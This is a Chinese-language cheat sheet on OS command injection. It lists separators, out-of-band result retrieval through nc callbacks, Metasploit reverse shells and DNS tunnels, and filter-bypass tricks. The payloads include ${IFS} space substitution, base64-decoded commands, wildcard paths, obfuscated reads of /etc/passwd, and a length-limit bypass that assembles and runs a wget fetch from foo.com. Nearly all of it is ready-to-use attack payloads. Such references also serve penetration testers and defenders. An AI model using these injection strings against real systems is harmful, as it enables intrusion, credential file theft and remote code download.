命令注入
========================================

常见注入方式
----------------------------------------
- 分号分割
- ``\r\n`` ``%d0%a0`` 换行 
- 反引号解析

无回显
----------------------------------------
- 利用bash命令并在本地进行nc监听结果查看回连日志
- msf反向回连
- DNS隧道

常见绕过方式
----------------------------------------

空格绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``<`` 符号 ``cat<123``
- ``\t`` / ``%09``
- ``${IFS}`` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

黑名单绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``a=l;b=s;$a$b``
- base64 `` `echo "bHM=" | base64 -d ` ``
- ``/?in/?s`` => ``/bin/ls``
- 连接符 ``cat /etc/pass'w'd``
- 未定义的初始化变量 ``cat$x /etc/passwd``

长度限制绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    >wget\
    >foo.\
    >com
    ls -t>a
    sh a

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行
直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令
这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看)
如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向
而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件

常用符号  
----------------------------------------

命令分隔符
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``%0a`` / ``%0d`` / ``\n`` / ``\r``
- ``;``
- ``&`` / ``&&``

通配符
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``*`` 0到无穷个任意字符
- ``?`` 一个任意字符
- ``[ ]``  一个在括号内的字符，e.g. ``[abcd]``
- ``[ - ]``  在编码顺序内的所有字符
- ``[^ ]`` 一个不在括号内的字符
